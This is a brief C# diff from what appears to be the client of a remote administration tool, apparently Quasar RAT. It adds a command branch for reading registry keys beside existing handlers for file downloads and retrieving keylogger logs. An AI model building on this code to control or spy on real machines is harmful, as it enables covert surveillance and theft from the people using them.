@@ -124,6 +124,10 @@ namespace xClient.Core.Packets
                 CommandHandler.HandleDoDownloadFileCancel((ServerPackets.DoDownloadFileCancel)packet,
                     client);
             }
+            else if (type == typeof(ServerPackets.DoLoadRegistryKey))
+            {
+                CommandHandler.HandleGetRegistryKey((ServerPackets.DoLoadRegistryKey)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
                 CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
